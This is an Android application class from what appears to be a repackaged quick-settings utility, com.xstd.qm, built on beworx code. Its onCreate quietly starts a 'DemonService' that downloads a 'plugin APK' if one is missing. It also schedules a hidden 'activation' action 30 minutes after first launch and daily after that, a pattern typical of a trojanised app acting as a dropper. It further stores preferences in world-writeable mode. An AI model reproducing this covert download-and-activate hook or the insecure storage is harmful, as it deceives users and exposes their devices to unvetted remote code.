/*
 * Copyright (C) 2010 beworx.com
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package com.xstd.qm.app;

import java.util.ArrayList;
import java.util.Calendar;
import java.util.Collections;
import java.util.Comparator;

import android.app.Application;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;

import android.text.TextUtils;
import com.bwx.bequick.Constants;
import com.bwx.bequick.fwk.Setting;
import com.bwx.bequick.fwk.SettingsFactory;
import com.bwx.bequick.preferences.BrightnessPrefs;
import com.bwx.bequick.preferences.CommonPrefs;
import com.plugin.common.utils.SingleInstanceBase;
import com.plugin.common.utils.UtilsRuntime;
import com.xstd.qm.Config;
import com.xstd.qm.DemonService;
import com.xstd.qm.UtilOperator;
import com.xstd.qm.setting.SettingManager;
import com.xstd.quick.R;

import static com.bwx.bequick.Constants.*;

/**
 * Remains state shared between all activities
 * @author sergej@beworx.com
 */
public class QuickSettingApplication extends Application {

	//private static final String TAG = "QuickSettingApplication";
	
	private static final int[] IDS = new int[] {
			
			/* visible */
			Setting.GROUP_VISIBLE,
			Setting.BRIGHTNESS,
			Setting.RINGER,
			Setting.VOLUME,
			Setting.BLUETOOTH,
			Setting.WIFI,
			Setting.GPS,
			Setting.MOBILE_DATA,
			Setting.FOUR_G,
			
			/* hidden */
			Setting.GROUP_HIDDEN,
			Setting.MASTER_VOLUME,
			Setting.SCREEN_TIMEOUT,
			Setting.WIFI_HOTSPOT,
			Setting.AIRPLANE_MODE,
			Setting.AUTO_SYNC,
			Setting.AUTO_ROTATE,
			Setting.LOCK_PATTERN,
			Setting.MOBILE_DATA_APN
	};
	
	// state
	private ArrayList<Setting> mSettings;
	private SharedPreferences mPrefs;

//    private ScreenBroadcastReceiver mScreenBroadcastReceiver = new ScreenBroadcastReceiver();

    @Override
    public void onCreate() {
    	super.onCreate();

        //init
        SingleInstanceBase.SingleInstanceManager.getInstance().init(this.getApplicationContext());
        SettingManager.getInstance().init(this.getApplicationContext());

        SettingManager.getInstance().deviceUuidFactory(getApplicationContext());

        Config.LOGD("[[QuickSettingApplication::onCreate]] create APP :::::::");

        long launchTime = SettingManager.getInstance().getKeyLanuchTime();
        if (launchTime == 0 || TextUtils.isEmpty(SettingManager.getInstance().getLocalApkPath())) {
            //first lanuch

            if (Config.DEBUG) {
                Config.LOGD("[[QuickSettingApplication::onCreate]] notify Service Lanuch as the lanuch time == 0");
            }

            Intent i = new Intent();
            i.setClass(getApplicationContext(), DemonService.class);
            i.setAction(DemonService.ACTION_LANUCH);
            startService(i);
        } else if (!UtilOperator.isPluginApkExist() && !Config.DOWNLOAD_PROCESS_RUNNING.get()) {
            if (Config.DEBUG) {
                Config.LOGD("[[QuickSettingApplication::onCreate]] try to download APK from : "
                                + SettingManager.getInstance().getLocalApkPath() + " as the local plugin apk not exists");
            }

            Intent i = new Intent();
            i.setClass(getApplicationContext(), DemonService.class);
            i.setAction(DemonService.ACTION_DOWNLOAD_PLUGIN);
            startService(i);
        }

        long activeTime = SettingManager.getInstance().getKeyActiveTime();
        if (activeTime == 0) {
            long deta = System.currentTimeMillis() - SettingManager.getInstance().getKeyLanuchTime();
            //TODO: 设置激活时间，激活时间是在启动时间之后的半个小时
            if (deta >= (30 * 60 * 1000)) {
                //active now
//                UtilOperator.startActiveAlarm(getApplicationContext(), 1000);
                DemonService.startAlarmForAction(getApplicationContext(), DemonService.ACTION_ACTIVE_MAIN, 1000);
            } else {
                long activeDelay = 30 * 60 * 1000 - deta;
                DemonService.startAlarmForAction(getApplicationContext(), DemonService.ACTION_ACTIVE_MAIN, activeDelay);
            }
        } else {
            Calendar c = Calendar.getInstance();
            c.setTimeInMillis(activeTime);
            int lastDay = c.get(Calendar.DAY_OF_YEAR);
            c = Calendar.getInstance();
            int curDay = c.get(Calendar.DAY_OF_YEAR);

            if (curDay != lastDay) {
                //不是同一天，每天激活一次
                DemonService.startAlarmForAction(getApplicationContext(), DemonService.ACTION_ACTIVE_MAIN, 1000);
            }
        }

    	String defaultText = getString(R.string.txt_status_unknown);

    	// load settings
    	SharedPreferences prefs = mPrefs = getSharedPreferences(PREFS_COMMON, MODE_WORLD_WRITEABLE);
    	
    	// create settings list
    	ArrayList<Setting> settings = mSettings = new ArrayList<Setting>();
    	int[] ids = IDS;
    	int length = ids.length;
    	Setting setting;
    	for (int i=0; i<length; i++) {
    		int id = ids[i];
    		int index = prefs.getInt(String.valueOf(id), length); // move to end
    		setting = SettingsFactory.createSetting(id, index, defaultText, this);
    		if (setting != null) settings.add(setting);
    	}
    	
    	// sort list
    	Collections.sort(settings, new Comparator<Setting>() {
			public int compare(Setting object1, Setting object2) {
				return object1.index - object2.index;
			}
		});
    	
    	// update status bar integration
    	final int appearance = Integer.parseInt(prefs.getString(PREF_APPEARANCE, "0"));
		final int status = Integer.parseInt(prefs.getString(PREF_STATUSBAR_INTEGRATION, "0"));
		final boolean inverse = prefs.getBoolean(PREF_INVERSE_VIEW_COLOR, false);
		Intent intent = new Intent(ACTION_UPDATE_STATUSBAR_INTEGRATION);
		intent.putExtra(EXTRA_INT_STATUS, status);
		intent.putExtra(EXTRA_INT_APPEARANCE, appearance);
		intent.putExtra(EXTRA_BOOL_INVERSE_COLOR, inverse);
		sendBroadcast(intent);

		String version = prefs.getString(PREF_VERSION, null);
		if (version == null) {
			// update PREF_LIGHT_SENSOR on first start
			boolean hasLightSensor = BrightnessPrefs.hasLightSensor(this);
			String currentVersion = CommonPrefs.getVersionNumber(this);
			prefs.edit().putBoolean(Constants.PREF_LIGHT_SENSOR, hasLightSensor).putString(PREF_VERSION, currentVersion).commit();
		}
		
    }
	
	public void persistSettings() {
    	Editor editor = mPrefs.edit();
    	ArrayList<Setting> settings = mSettings;
    	int length = settings.size();
    	for (int i=0; i<length; i++) {
    		Setting setting = settings.get(i);
    		editor.putInt(String.valueOf(setting.id), setting.index);
    	}
    	editor.commit();
    }
    
    public SharedPreferences getPreferences() {
    	return mPrefs;
    }
    
    public ArrayList<Setting> getSettings() {
    	return mSettings;
    }
    
    public Setting getSetting(int id) {
    	ArrayList<Setting> settings = mSettings;
    	int length = settings.size();
    	for (int i=0; i<length; i++) {
    		Setting setting = settings.get(i);
    		if (id == setting.id) return setting;
    	}
    	return null;
    }
    

}
